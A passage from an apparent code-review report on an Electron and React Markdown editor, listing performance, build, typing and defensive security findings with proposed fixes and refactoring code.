| Recent-files collection state | 47 | `useRecentFiles()` |
| Tabs + active-tab state | 50-51 | `useTabs()` (reducer) |
| Drag-and-drop overlay state | 54-55 | `useFileDrop()` |
| Cross-pane scroll-sync lock + handlers | 58-60, 81-103 | `useScrollSync()` |
| Cursor position state | 61 | `useCursorPosition()` |
| Modal visibility (5 modals + lightbox) | 64-68 | `useModalStack()` |
| Toast/notification system | 71-78 | `useToast()` |
| Derived `activeTab` lookup | 166 | selector (derive, don't store) |
| Open-by-id: IDB handle read, cached-content fallback, line jump, record rewrite | 169-237 | `useDocumentActions()` |
| File System Access API open + `<input type=file>` fallback | 240-356 | `services/fsAccess.ts` |
| New-document creation | 359-379 | `useDocumentActions()` |
| Content mutation (the typing hot path) | 382-397 | `useTabs()` reducer |
| FS permission verification helper | 400-413 | `services/fsAccess.ts` |
| Save-to-disk + IDB fallback + confetti + record rebuild | 416-496 | `useDocumentActions()` |
| Save As (FS Access) + download fallback | 499-582 | `services/fsAccess.ts` |
| View-mode switching | 585-590 | `useTabs()` reducer |
| Tab close + active-tab re-selection | 593-608 | `useTabs()` reducer |
| Pin / delete / clear-history (IDB mutations) | 611-628 | `useRecentFiles()` |
| Markdown insertion helper | 631-638 | `useEditorBridge()` |
| Global keyboard shortcut registry | 641-672 | `useHotkeys()` |
| Window drag-and-drop file ingestion | 675-764 | `useFileDrop()` |
| Layout & render orchestration | 768-997 | `<AppShell>` (thin) |
| `MarkdownFileRecord` construction (copy-pasted 7×) | 263-276, 320-332, 436-449, 470-482, 522-535, 716-728 | `services/fileRecord.ts` |
| Fabricated Windows paths (`C:\Users\Windows\Documents\…`) | 266, 323, 367, 439, 473, 525, 719 | `services/fsAccess.ts` |

### Proposed target architecture

```
src/
  app/
    App.tsx                    # <80 lines: providers + shell only
    ErrorBoundary.tsx
    providers.tsx              # ThemeProvider, ToastProvider, ModalProvider
  stores/
    documentStore.ts           # zustand: tabs, activeTabId, content, viewMode  (single reducer)
    settingsStore.ts           # zustand + persist middleware -> localStorage
    libraryStore.ts            # zustand: recentFiles, pinned  (IDB-backed)
    selectors.ts               # activeTab, isDirty, wordCount — memoized
  hooks/
    useHotkeys.ts              // useKeyboardShortcuts(): (registry: Shortcut[]) => void
    useScrollSync.ts           // useScrollSync(): { editorRef, previewRef }
    useToast.ts                // useToast(): { toast(msg, opts?), node }
    useModalStack.ts           // useModalStack(): { open(id), close(id), isOpen(id) }
    useFileDrop.ts             // useFileDrop(onFiles: (File[]) => Promise<void>)
    useDebouncedValue.ts // useDebouncedValue<T>(v: T, ms: number): T useFsAccess.ts             // useFsAccess(): { openFile, saveFile, saveFileAs, hasApi }
  services/
    markdown/                  # parser.ts (marked + hljs core), highlight.ts, metrics.ts
    storage/                   # idb.ts (thin), fileRepository.ts (pure mapping)
    fileSystem.ts              # FS Access API adapter (interface -> fakes in tests)
    search.ts                  # pure: (files, q) => FileSearchResult[]
    fileRecord.ts              # makeFileRecord(): the7× duplicated literal
  components/
    shell/   TitleBar, TabBar, CommandBar, StatusBar
    editor/  RawEditor, MarkdownPreview, EditorPane   # React.memo + lazy    modals/  ExportModal, CommandPalette, SampleFilesModal, ShortcutsModal, ImageLightbox
    home/    HomePage, RecentFilesTable, SearchResults, PinnedGrid
  types/
    domain.ts, ipc.ts, fs.d.ts
```

**Hook signatures (actionable):**

```ts
// stores/documentStore.ts — replaces useState pile + 5 useCallbacks
interface DocumentState {
  tabs: Record<string, FileTab>;
  order: string[];              // FileTab[] -> keyed, avoids O(n) .find() per render
  activeTabId: string | null;
}
type DocumentAction =
  | { type: 'OPEN'; tab: FileTab }
  | { type: 'CLOSE'; id: string }
  | { type: 'ACTIVATE'; id: string | null }
  | { type: 'EDIT'; id: string; content: string }
  | { type: 'SET_VIEW_MODE'; id: string; mode: ViewMode }
  | { type: 'MARK_SAVED'; id: string; content: string }
  | { type: 'OPEN_EXISTING'; id: string; lineToJump?: number };

export const useDocumentStore = create<DocumentState & {
  dispatch: (a: DocumentAction) => void;
}>(...);

// selectors — computed once, cached, not recomputed per render
export const useActiveTab = () =>
  useDocumentStore(s => (s.activeTabId ? s.tabs[s.activeTabId] : null));
export const useIsDirty = () =>
  useDocumentStore(s => { const t = s.activeTabId && s.tabs[s.activeTabId];
 return !!t && t.content !== t.originalContent; });

// hooksexport function useHotkeys(registry: Shortcut[]): void; // registry module, not closures
export function useScrollSync<T extends HTMLElement>(): {
  leftRef: RefObject<T>; rightRef: RefObject<T>; onLeftScroll(p: number): void;
};
export function useToast(): { notify(msg: string, kind?: 'info'|'error'): void };
export function useModalStack(): { open(id: ModalId): void; close(id: ModalId): void; isOpen(id: ModalId): boolean };
export function useDebouncedValue<T>(value: T, ms = 180): T;
export function useFsAccess(): FsAccess;   // { open, save, saveAs, supported } — injectable
```

**Why zustand over `useReducer`:** the store has three independent consumers (`TabBar`, `CommandBar`, `StatusBar`) that must not re-render on keystrokes, and the editor needs the *content* to update at 60fps while the *tab bar* does not. A `useReducer` in `App` cannot achieve that without splitting into N contexts and hand-rolling subscription. Zustand gives selector-scoped subscriptions with ~1 kB. Use `useReducer` + context **only** if you want zero new dependencies — in which case split into `DocumentContext` (state) + `DocumentActionsContext` (stable dispatch) so the 87 props of callbacks don't propagate.

**Component tree (memo boundaries marked `*`):**

```
<AppShell>
  <ErrorBoundary> ← does not exist today
    <ThemeProvider> <ToastProvider> <ModalProvider>
      <TitleBar* activeTabId isDirty />        ← select2 fields, not the tab
      <TabBar* tabs order+dirtyBits /> ← select order, not objects
      <CommandBar* viewMode isDirty />         ← 20 props → 4
      <main>
        <HomePage/>          OR        <EditorPane viewMode>
          <RawEditor* />      ← lazy + React.memo
          <MarkdownPreview* />← lazy + React.memo
        </EditorPane>
      </main>
      <StatusBar* wordCount /> ← select derived number
      <ModalHost>  ← renders only the open modal (today: 5 mounted always)
```

---

### Findings

#### [HIGH] A1. `npm install` fails — a fresh clone cannot install or build

- **File:** `package.json:62` (+ `package.json:62` vs `vite@8`'s peer range)
- **Code:**
  ```json
  "devDependencies": { "esbuild": "^0.25.0", "tsx": "^4.21.0" }
  ```
- **Problem / impact:** Verified by running `npm install --legacy-peer-deps` in the repo — it **exits non-zero** and npm rolls the whole tree back, leaving zero packages installed:
  ```
  npm error code1
  npm error path ...\node_modules\tsx\node_modules\esbuild
  npm error Error: Expected "0.28.2" but got "0.25.12"
      at validateBinaryVersion (.../esbuild/install.js:137:11)
  ```
  Root cause: `esbuild@^0.25.0` is pinned explicitly while `vite@8.3.2` (latest) and `tsx@4.23.15` resolve `esbuild` to **0.28.2**. npm dedupes the platform binary (`@esbuild/win32-x64`) to the pinned 0.25.12 while the JS package is 0.28.2, and esbuild's postinstall version assertion aborts the install. `vite@8.3.2` declares `peerOptional` `esbuild@"^0.27.0 || ^0.28.0"`, which `^0.25.0` also fails — so without `--legacy-peer-deps` this surfaces as an `ERESOLVE` peer conflict instead. Either way: **broken**. The CI workflow (`.github/workflows/build-windows-exe.yml:32`) runs exactly `npm install --legacy-peer-deps`, so **CI is red on every push** and no `.exe` is produced.
- **Fix:** delete the pin and let `vite` own the version, or force alignment:
  ```jsonc
  // package.json — remove "esbuild" from devDependencies entirely (vite pulls it)
  "overrides": { "esbuild": "^0.28.2" }
  ```
  ```bash
  rm -rf node_modules package-lock.json && npm install
  ```
  Then verify: `npm run lint && npm run build` must both exit 0 on a clean clone. Add this as a CI gate.

#### [HIGH] A2. `highlight.js` full import + `highlightAuto` = ~190 languages parsed per code block, per keystroke

- **File:** `src/services/markdown.ts:2`, `src/services/markdown.ts:36`
- **Code:**
  ```ts
  import hljs from 'highlight.js';                    // main entry: ALL languages
  // ...
  highlightedCode = hljs.highlightAuto(text).value;   // runs every registered language
  ```
- **Problem / impact:** `highlight.js` (main entry) registers every bundled grammar (~190 languages); it is the documented ~1 MB+ path versus `highlight.js/lib/core`. Worse, `markdown.ts:36` calls `highlightAuto` for **any fenced block without a language** — that executes *all* registered grammars against the snippet. `parseMarkdown` runs on every content change (`MarkdownPreview.tsx:26`), so for a document with 20 unlabelled code fences, every single keystroke triggers20 ×190 grammar executions. This is the dominant frame cost in Preview and Split mode. `index.css:2` additionally imports `highlight.js/styles/github-dark.css` — and only the **dark** theme, so light-mode code blocks are unstyled.
- **Fix:**
  ```ts
  // src/services/markdown/highlight.ts
  import hljs from 'highlight.js/lib/core';
  import javascript from 'highlight.js/lib/languages/javascript';
  import typescript from 'highlight.js/lib/languages/typescript';
  import python from 'highlight.js/lib/languages/python';
  import bash from 'highlight.js/lib/languages/bash';
  import json from 'highlight.js/lib/languages/json';
  import xml from 'highlight.js/lib/languages/xml';
  import css from 'highlight.js/lib/languages/css';

  for (const l of [javascript, typescript, python, bash, json, xml, css])
    hljs.registerLanguage(l.name, l);

  export function highlight(code: string, lang?: string): string {
    if (lang && hljs.getLanguage(lang)) return hljs.highlight(code, { language: lang }).value;
    return hljs.highlight(code, { language: 'plaintext' }).value; // never highlightAuto
  }
  ```
  Register only the languages the sample documents actually use (7 above). Never call `highlightAuto` on the keystroke path. Ship both `github-dark.css` and `github.css`, swapped by the `html.dark`/`html.light` class already in `index.css`.

#### [HIGH] A3. Zero error boundaries — any render throw is a white screen and total data loss

- **File:** repo-wide (0 matches for `ErrorBoundary`, `componentDidCatch`, `getDerivedStateFromError`)
- **Code:**
  ```
  React.memo            0
  React.lazy            0
  Suspense              0
  createContext         0
  useReducer            0
  ErrorBoundary         0
  debounce              0
  ```
  `grep 'throw '` → **0**. `try` = 22, `catch` = 23, `.catch(` = 2. Of the 23 catches, **21 are `console.warn`/`console.error` and swallow**.
- **Problem / impact:** `main.tsx:5` mounts `<App/>` with no boundary. The single most likely thrower is `src/services/markdown.ts:83`:
  ```ts
  return markedInstance.parse(markdown) as string;
  ```
  Wrapped in `try/catch` (good) — but `markdown.ts:75` calls `markedInstance.parse(rawText)` **inside the blockquote renderer**, i.e. re-entrant parsing that the outer `try` covers only partially. And `MarkdownPreview.tsx:147` assigns that output straight to `dangerouslySetInnerHTML`. A malformed doc, a `highlightAuto` internal error escaping the `catch` at `markdown.ts:38`, or a bad image URL leaves the user with a blank window and **unsaved edits gone** — there is no recovery path and no `beforeunload` guard for dirty tabs.
- **Fix:**
  ```tsx
  // src/app/ErrorBoundary.tsx
  import { Component, type ErrorInfo, type ReactNode } from 'react';
  export class ErrorBoundary extends Component<
    { children: ReactNode; label: string },
    { error: Error | null }
  > {
    state = { error: null as Error | null };
    static getDerivedStateFromError(error: Error) { return { error }; }
    componentDidCatch(error: Error, info: ErrorInfo) { console.error(this.props.label, error, info); }
    render() {
      if (!this.state.error) return this.props.children;
      return (
        <div role="alert" className="p-8 text-rose-400">
          <h2 className="font-bold">{this.props.label} failed to render</h2>
          <pre className="mt-2 text-xs whitespace-pre-wrap">{String(this.state.error)}</pre>
          <button onClick={() => this.setState({ error: null })}>Retry</button>
        </div>
      );
    }
  }
  ```
  Wrap in `main.tsx` at the root, plus one around `<EditorPane>` and one around each modal. Add `beforeunload` when any tab is dirty.

#### [HIGH] A4. Markdown fully re-parsed on every keystroke — no debounce anywhere in the repo

- **File:** `src/components/MarkdownPreview.tsx:26`
- **Code:**
  ```ts
  const htmlContent = React.useMemo(() => parseMarkdown(content), [content]);
  ```
- **Problem / impact:** The `useMemo` is *correct but useless*: `content` is the dependency and it changes on every keystroke (`App.tsx:382-397` → `tabs` → `content`), so the cache hit rate is **0%**. `debounce` grep count across the repo is **0**. Concretely, in Split mode one keystroke triggers: `parseMarkdown` (marked + hljs), a full `dangerouslySetInnerHTML` innerHTML replacement (destroying and rebuilding the entire DOM subtree, which also resets scroll position), plus `RawEditor.tsx:44-46` `content.split('\n')`, plus the gutter re-render at `RawEditor.tsx:332`, plus `StatusBar.tsx:20` `calculateWordCount`. On a 200 KB document this is easily 100-300 ms/keystroke — the app feels broken. Worse, `ExportModal.tsx:25-28` parses the **same document a second time** on the same keystroke (and a third in Split mode), because it holds its own `useMemo` over `markdownContent`.
- **Fix:** keep the editor instant, debounce the *render*:
  ```ts
  // src/components/MarkdownPreview.tsx
  const debounced = useDebouncedValue(content, 180);
  const htmlContent = useMemo(() => parseMarkdown(debounced), [debounced]);
  ```
  Also lift `ExportModal`'s parse behind the same `debounced` value or gate it behind a user click ("Render HTML") so a hidden modal never re-parses.

#### [HIGH] A5. 10 MB file: word count materializes an array of every word, per keystroke, in three places

- **File:** `src/services/markdown.ts:90-94`
- **Code:**
  ```ts
  export function calculateWordCount(text: string): number {
    if (!text) return 0;
    const words = text.trim().match(/\S+/g);   // allocates an array of EVERY token
    return words ? words.length : 0;
  }
  ```
- **Problem / impact:** `.match(/\S+/g)` is the classic O(n)-space mistake. For a 10 MB document it allocates a ~1.7 M-element array of substrings — roughly 100-200 MB of transient heap — and it runs: on file open (`App.tsx:260,318,435,469,520,714`), on save (`App.tsx:435`), **and on every keystroke** via `StatusBar.tsx:20`. A malformed/hostile file (10 MB of `a a a a …`) will freeze or OOM the renderer with no guard, no size limit, and no error surface. There is no file-size check anywhere: `handleOpenLocalFile` (`App.tsx:240`) and the drop handler (`App.tsx:699`) accept any size.
- **Fix:**
  ```ts
  export function calculateWordCount(text: string): number {
    let n = 0, inWord = false;
    for (let i = 0; i < text.length; i++) {
      const c = text.charCodeAt(i);
      const ws = c === 32 || c === 9 || c === 10 || c === 13;
      if (!ws) inWord = true; else if (inWord) { n++; inWord = false; }
    }
    return inWord ? n + 1 : n;
  }
  ```
  O(1) space. Then gate ingestion: reject `> 5 MB` with a toast, and debounce the `StatusBar` metric (`useDebouncedValue(content, 400)`).

#### [HIGH] A6. No Electron preload — file I/O runs on the renderer, window controls are fake, IPC does not exist

- **File:** `electron/main.cjs:1-58` (no `preload.cjs` in the tree), `src/components/TitleBar.tsx:130-160`
- **Code:**
  ```js
  webPreferences: { nodeIntegration: false, contextIsolation: true, webSecurity: true },
  ```
  ```tsx
  <button onClick={() => { window.blur(); }}  title="Minimize">   // TitleBar.tsx:132
  <button onClick={toggleFullscreen}            title="Maximize">   // TitleBar.tsx:142
  <button onClick={() => { if (activeTab) window.close(); }} title="Close">  // TitleBar.tsx:153
  ```
- **Problem / impact:** The security posture is correct (`contextIsolation: true`, `nodeIntegration: false`), but **the app therefore has no privileged capability at all** — everything is bolted onto the browser File System Access API. `main.cjs` registers **zero** `ipcMain.handle` handlers, so the renderer's `window.close()` / `window.blur()` / fullscreen calls go nowhere: in the packaged app the three Windows caption buttons are decorative, `frame: true` (`main.cjs:14`) means the OS draws a *second* title bar, and "Close" only fires when a tab happens to be open (`if (activeTab)`) — with the Home view active, the app cannot be closed from its own chrome. `win.setMenuBarVisibility(false)` (`main.cjs:25`) also removes native copy/paste accelerators. Running `npm run dev` in a plain browser: the caption buttons are no-ops, `window.print()` works, FS Access works in Chromium. There is no capability probe anywhere, so the UI presents identical affordances in both environments and lies in one of them.
- **Fix** — create `electron/preload.cjs` and `electron/ipc.cjs`:
  ```js
  // electron/preload.cjs
  const { contextBridge, ipcRenderer } = require('electron');

  /** @type {import('../src/types/ipc').VeloxBridge} */
  const api = {
    platform: process.platform,
    versions: { electron: process.versions.electron },
    window: {
      minimize: () => ipcRenderer.invoke('window:minimize'),
      maximize: () => ipcRenderer.invoke('window:maximize'),
      isMaximized: () => ipcRenderer.invoke('window:isMaximized'),
      close: (force) => ipcRenderer.invoke('window:close', force),
      onMaximizeChange: (cb) => {
        const l = (_e, v) => cb(v);
        ipcRenderer.on('window:maximize-changed', l);
        return () => ipcRenderer.removeListener('window:maximize-changed', l);
      },
    },
    fs: {
      open: () => ipcRenderer.invoke('fs:open'),
      save: (p, c) => ipcRenderer.invoke('fs:save', { path: p, content: c }),
      saveAs: (c, suggested) => ipcRenderer.invoke('fs:saveAs', { content: c, suggested }),
      read: (p) => ipcRenderer.invoke('fs:read', p),
      stat: (p) => ipcRenderer.invoke('fs:stat', p),
      onExternalOpen: (cb) => {
        const l = (_e, p) => cb(p);
        ipcRenderer.on('fs:external-open', l);
        return () => ipcRenderer.removeListener('fs:external-open', l);
      },
    },
  };

  contextBridge.exposeInMainWorld('velox', api);   // narrow, named, no raw ipcRenderer
  ```
  ```js
  // electron/ipc.cjs
  const { ipcMain, dialog, shell, app, BrowserWindow } = require('electron');
  const fs = require('node:fs/promises');
  const path = require('node:path');

  const MD = [{ name: 'Markdown', extensions: ['md', 'markdown', 'mdown', 'mkd', 'txt'] }];
  const MAX_BYTES = 5 * 1024 * 1024;

  async function assertSize(p) {
    const st = await fs.stat(p);
    if (st.size > MAX_BYTES) throw new Error(`File too large (${st.size} bytes, max ${MAX_BYTES})`);
    return st;
  }

  function register() {
    const win = () => BrowserWindow.getFocusedWindow() ?? BrowserWindow.getAllWindows()[0];

    ipcMain.handle('fs:open', async () => {
      const r = await dialog.showOpenDialog(win(), { properties: ['openFile', 'multiSelections'], filters: [MD] });
      if (r.canceled || !r.filePaths[0]) return null;             // explicit "user cancelled"
      const filePath = r.filePaths[0];
      await assertSize(filePath);
      const content = await fs.readFile(filePath, 'utf8');
      return { path: filePath, name: path.basename(filePath), content,
               size: (await fs.stat(filePath)).size, lastModified: Date.now() };
    });

    ipcMain.handle('fs:save', async (_e, { path: filePath, content }) => {
      await assertSize(filePath);
      await fs.writeFile(filePath, content, 'utf8');
      return { ok: true, bytes: Buffer.byteLength(content, 'utf8') };
    });

    ipcMain.handle('fs:saveAs', async (_e, { content, suggested }) => {
      const r = await dialog.showSaveDialog(win(), { defaultPath: suggested, filters: [MD] });
      if (r.canceled || !r.filePath) return null;
      await fs.writeFile(r.filePath, content, 'utf8');
      return { ok: true, path: r.filePath, name: path.basename(r.filePath) };
    });

    ipcMain.handle('fs:read', async (_e, filePath) => {
      await assertSize(filePath);
      return fs.readFile(filePath, 'utf8');
    });

    ipcMain.handle('fs:stat', async (_e, filePath) => {
      try { const s = await fs.stat(filePath); return { exists: true, size: s.size, mtime: s.mtimeMs }; }
      catch { return { exists: false }; }                        // file deleted while open
    });

    ipcMain.handle('window:minimize', () => { win()?.minimize(); });
    ipcMain.handle('window:maximize', () => { const w = win(); w?.isMaximized() ? w.unmaximize() : w?.maximize(); });
    ipcMain.handle('window:isMaximized', () => win()?.isMaximized() ?? false);
    ipcMain.handle('window:close', (_e, force) => {
      const w = win(); if (!w) return;
      force || w.webContents.send('fs:before-close') || w.destroy();  // renderer vetoes if dirty
    });
  }
  module.exports = { register, MD };
  ```
  ```js
  // electron/main.cjs — additions
  const { register } = require('./ipc.cjs');
  app.whenReady().then(() => {
    register();
    createWindow();
    app.on('open-file', (e, p) => { e.preventDefault(); win.webContents.send('fs:external-open', p); });
  });
  ```
  ```ts
  // src/types/ipc.ts — one source of truth for both sides
  export interface OpenResult { path: string; name: string; content: string; size: number; lastModified: number }
  export interface VeloxBridge {
    platform: NodeJS.Platform;
    window: { minimize(): Promise<void>; maximize(): Promise<void>; isMaximized(): Promise<boolean>;
              close(force?: boolean): Promise<void>; onMaximizeChange(cb: (v: boolean) => void): () => void };
    fs: { open(): Promise<OpenResult | null>; save(p: string, c: string): Promise<{ ok: boolean }>;
          saveAs(c: string, s: string): Promise<{ path: string; name: string } | null>;
          read(p: string): Promise<string>;
          stat(p: string): Promise<{ exists: boolean; size?: number; mtime?: number }>;
          onExternalOpen(cb: (p: string) => void): () => void };
  }
  declare global { interface Window { velox?: VeloxBridge } }
  ```
  Then make the renderer adapter **capability-detected** and fall back cleanly:
  ```ts
  export function useFsAccess(): FsAccess {
    const bridge = window.velox;
    return useMemo(() => bridge
      ? { supported: true, open: bridge.fs.open, save: bridge.fs.save, saveAs: bridge.fs.saveAs }
      : webFsAccess(), [bridge]);
  }
  ```
  Disable the caption buttons in `TitleBar` when `!window.velox`. Never `contextIsolation: false`; never expose `ipcRenderer` itself.

#### [HIGH] A7. Hardcoded fake paths shown to users as "Windows File Path"

- **File:** `src/App.tsx:266, 323, 367, 439, 473, 525, 719`
- **Code:**
  ```ts
  path: `C:\\Users\\Windows\\Documents\\${file.name}`,
  ```
- **Problem / impact:** Seven occurrences fabricate a path for files the user opened from an arbitrary location, or created in-app. `HomePage.tsx:469` renders it in a column literally headed **"Windows File Path"**, with a copy-to-clipboard button (`:472`) that copies a path which does not exist. `StatusBar.tsx:57` and `TitleBar.tsx:67` display it too. Reopening relies on `storage.ts:117` matching `f.path === file.path` — so two different files with the same basename in different folders collide and **overwrite each other**. This is a correctness bug, not cosmetics.
- **Fix:** use `fileHandle` and only synthesise a path when you genuinely know it:
  ```ts
  // services/fsAccess.ts
  export async function pathOf(handle: FileSystemFileHandle): Promise<string | undefined> {
    try { return (await handle.resolve?.()) ?? undefined; } catch { return undefined; }
  }
  ```
  Store `path?: string` (it already is optional on `FileTab`, `types/index.ts:45`) and render `—` when unknown. Key records by a content hash or the handle, not by path.

#### [HIGH] A8. `tsconfig.json` — `strict` is off; the compiler is doing almost nothing

- **File:** `tsconfig.json:2-26`
- **Code:**
  ```json
  { "compilerOptions": { "target": "ES2022", "moduleResolution": "bundler",
 "allowJs": true, "allowImportingTsExtensions": true, "noEmit": true, ... } }
  ```
- **Problem / impact:** There is **no `"strict"` key at all** — `strict: true` is *off*, so `strictNullChecks` is off. That is why `null` assignments (`App.tsx:68`, `:51`) and `file?.name` chains need no guards and why 7 `any`s compile silently. Also missing: `noUncheckedIndexedAccess`, `noUnusedLocals`, `noUnusedParameters`, `noImplicitOverride`, `noFallthroughCasesInSwitch`, `noImplicitReturns`, `exactOptionalPropertyTypes`, `forceConsistentCasingInFileNames`, `verbatimModuleSyntax`, `isolatedDeclarations`. Vestigial and misleading: `experimentalDecorators: true` and `useDefineForClassFields: false` (`tsconfig.json:4-5`) — the codebase has **no decorators and no classes**. `allowJs: true` type-checks the JS `electron/main.cjs` under weak assumptions. There is no `include`/`exclude`, so `tsc --noEmit` (the `lint` script) has an implicit, undocumented file set.
- **Fix:**
  ```jsonc
  {
    "compilerOptions": {
      "target": "ES2022",
      "lib": ["ES2022", "DOM", "DOM.Iterable"],
      "module": "ESNext",
      "moduleResolution": "bundler",
      "jsx": "react-jsx",
      "types": ["vite/client", "vite-plugin-pwa/client"],
      "noEmit": true,
      "isolatedModules": true,
      "moduleDetection": "force",
      "verbatimModuleSyntax": true,
      "skipLibCheck": true,
      "strict": true,
      "noUncheckedIndexedAccess": true,
      "noUnusedLocals": true,
      "noUnusedParameters": true,
      "noImplicitOverride": true,
      "noImplicitReturns": true,
      "noFallthroughCasesInSwitch": true,
      "exactOptionalPropertyTypes": true,
      "forceConsistentCasingInFileNames": true
    },
    "include": ["src", "vite.config.ts"],
    "exclude": ["dist", "release", "node_modules"]
  }
  ```
  Expect a burst of errors on first enable (`window.velox!`, `lines[i]`, the 7 `any`s). That is the point — do it as its own PR.

#### [MED] A9. Seven genuine `any` types, concentrated in two files

- **File:** `src/App.tsx:243, 300, 400, 463, 504, 565`; `src/services/markdown.ts:72`
- **Code:**
  ```ts
  const [handle] = await (window as any).showOpenFilePicker({ ... });   // App.tsx:243
  const verifyPermission = async (fileHandle: any, readWrite: boolean) => // App.tsx:400
  blockquote(token: any) { ... }                                        // markdown.ts:72
  ```
- **Problem / impact:** All six in `App.tsx` exist to route around the missing DOM lib types for File System Access. `(window as any).showOpenFilePicker` means the picker options object is **completely unchecked** — the `accept` map at `:248-250` is never validated. `catch (err: any)` at `:300, :463, :565` throws away the `unknown` safety net that `strict` mode gives you for free.
- **Fix:**
  ```ts
  // src/types/fs.d.ts — add to tsconfig "include"
  interface FilePickerAcceptType { description?: string; accept: Record<string, string[]> }
  interface OpenFilePickerOptions { multiple?: boolean; types?: FilePickerAcceptType[]; excludeAcceptAllOption?: boolean }
  interface SaveFilePickerOptions { suggestedName?: string; types?: FilePickerAcceptType[] }
  interface Window {
    showOpenFilePicker?(o?: OpenFilePickerOptions): Promise<FileSystemFileHandle[]>;
    showSaveFilePicker?(o?: SaveFilePickerOptions): Promise<FileSystemFileHandle>;
    showDirectoryPicker?(o?: { mode?: 'read' | 'readwrite' }): Promise<FileSystemDirectoryHandle>;
  }
  ```
  Then `catch (err: unknown)` with a narrowing helper:
  ```ts
  const isAbort = (e: unknown): e is DOMException => e instanceof DOMException && e.name === 'AbortError';
  ```

#### [MED] A10. Dev server exposed to the LAN — `--host=0.0.0.0`

- **File:** `package.json:9`
- **Code:** `"dev": "vite --port=3000 --host=0.0.0.0"`
- **Problem / impact:** Binds the dev server to every interface. On a coffee-shop or corporate WLAN, anyone on the same subnet can fetch `http://<your-ip>:3000` and run arbitrary JS in the origin of a **Markdown editor that holds file handles and document contents in IndexedDB**. `vite@8` also has no host allow-list configured (`vite.config.ts:61-65` sets only `hmr`/`watch`). There is no authentication. This is a local-app security smell, not a production vuln, but it is free to fix.
- **Fix:**
  ```json
  "dev": "vite --port=3000"
  ```
  ```ts
  // vite.config.ts
  server: { host: '127.0.0.1', port: 3000, strictPort: true,
 hmr: process.env.DISABLE_HMR !== 'true',
            watch: process.env.DISABLE_HMR === 'true' ? null : {} },
  ```

#### [MED] A11. No ESLint, no Prettier — `"lint"` is a type-check in disguise

- **File:** `package.json:13`
- **Code:** `"lint": "tsc --noEmit"`
- **Problem / impact:** There is no linter and no formatter anywhere in the repo (no `eslint.config.*`, no `.prettierrc*`). `"lint"` type-checks only. Nothing enforces the React Hooks exhaustive-deps rule, which matters here: **19 `useCallback`s and 15 `useEffect`s** exist and at least three are provably wrong (below). It also means the reported 7 `any`s, the `console.warn` swallowing, and the unused-import class of bugs are all invisible. Also `ShortcutsModal.tsx:2` imports `Command` from `lucide-react` and never uses it; `ImageLightboxModal.tsx:2` imports `Download` and never uses it; `HomePage.tsx:9-18` imports 6 unused icons (`CheckCircle`, `Laptop`, `HardDrive`, `Trash2` used, `ExternalLink`…); `CommandPalette.tsx:14` imports `Sparkles` (used), `Download` unused.
- **Fix:** see **Recommended tooling setup** below.

#### [MED] A12. Three independent search implementations, none debounced, all O(corpus) per keystroke

- **File:** `src/services/search.ts:7-91`, `src/components/RawEditor.tsx:182-197`, `src/components/CommandPalette.tsx:66`
- **Code:**
  ```ts
  // CommandPalette.tsx:66 — lowercases EVERY BYTE of EVERY file on EVERY keypress
  .filter((f) => f.name.toLowerCase().includes(q) || f.content.toLowerCase().includes(q))
  ```
  ```ts
  // RawEditor.tsx:182-197 — no debounce, allocates a result array per keystroke
  useEffect(() => { const text = content.toLowerCase(); let idx = text.indexOf(query);
                     while (idx !== -1) { results.push({start: idx, end: idx + query.length});
 idx = text.indexOf(query, idx + query.length); } ... },
            [searchQuery, content]);
  ```
- **Problem / impact:** (1) `search.ts:17` does `file.content.split('\n')` for **every file** on **every keystroke** — allocating an array of every line of the whole corpus, then `indexOf`-scanning each line (`search.ts:26-58`). Cost is O(total corpus bytes) per keypress. (2) `CommandPalette.tsx:66` allocates a full lowercase **copy of every indexed document** per keystroke, and its `useMemo` dependency array (`CommandPalette.tsx:151-163`) lists 10 callbacks that `App` recreates on every render — so the memo is invalidated on *any* state change, not just query changes; the memo provides no benefit at all. (3) `RawEditor.tsx:182` re-scans the current document on every keystroke while find is open, again with no debounce, building a fresh array of all match offsets (unbounded — a 10 MB doc matching `e` yields ~10 M objects). Three codebases, one behaviour, no shared implementation.
- **Fix:** one pure, debounced, indexed implementation.
  ```ts
  // services/searchIndex.ts — build once per library change, not per keystroke
  export interface SearchIndex { id: string; lower: string; lines: string[]; lineOffsets: number[] }
  export function buildIndex(files: MarkdownFileRecord[]): SearchIndex[] { /* lower + offsets once */ }

  // services/search.ts
  export function searchMarkdownFiles(idx: SearchIndex[], q: string): FileSearchResult[] {
    const query = q.trim().toLowerCase();
    if (!query) return [];
    const out: FileSearchResult[] = [];
    for (const f of idx) { // no split(), no per-keystroke lowercase
      let pos = f.lower.indexOf(query);
      if (pos === -1) continue;
      let total = 0; const snippets: SearchContextSnippet[] = [];
      while (pos !== -1 && total < 500) { total++;
        if (snippets.length < 4) snippets.push({ ...snippetAt(f, pos, query) });
        pos = f.lower.indexOf(query, pos + query.length); }
      out.push({ file: f, matchesCount: total, snippets });
    }
    return out.sort((a, b) => b.matchesCount - a.matchesCount || b.lastOpened - a.lastOpened);
  }
  ```
  Consume it through `useDebouncedValue(searchQuery, 200)`. Cap `RawEditor`'s match array at 1000 and show `1000+`.

#### [MED] A13. `MarkdownFileRecord` construction copy-pasted 7 times; `FileHistoryItem` is 100% redundant

- **File:** `src/App.tsx:263-276, 320-332, 436-449, 470-482, 522-535, 716-728`; `src/services/storage.ts:93-109`
- **Code:**
  ```ts
  // storage.ts:93 — persisted duplicate of data already in RECENT_FILES
  async function syncFileHistory(files: MarkdownFileRecord[]): Promise<void> {
    const history: FileHistoryItem[] = files.map((f) => ({ id: f.id, name: f.name, ... }));
    await set(STORAGE_KEYS.FILE_HISTORY, history);
  }
  ```
- **Problem / impact:** The same 11-field object literal is written seven times with drifting fields: `hasFileSystemHandle` is present in some copies (`:275,448, 534`) and absent in others (`:332, 482, 728`); tags differ per code path (`'Windows File'`, `'Imported'`, `'Dropped File'`, `'Edited'`, `'Draft'`). Any new field means seven edits — and three were missed. Separately, `velox_file_history_v2` stores a 7-field projection of records already stored under `velox_recent_files_v2`, doubling write amplification on every save for data nothing reads (`getFileHistory` is exported and **never imported** — verified: not in the import graph).
- **Fix:**
  ```ts
  // services/fileRecord.ts
  export function makeFileRecord(i: {
    id: string; name: string; path?: string; content: string;
    size: number; lastModified?: number; tags?: string[]; fileHandle?: FileSystemFileHandle;
  }): MarkdownFileRecord {
    const wordCount = calculateWordCount(i.content);
    return { id: i.id, name: i.name, path: i.path ?? '', content: i.content, size: i.size,
             lastOpened: Date.now(), lastModified: i.lastModified ?? Date.now(),
             wordCount, readingTimeMinutes: calculateReadingTime(wordCount),
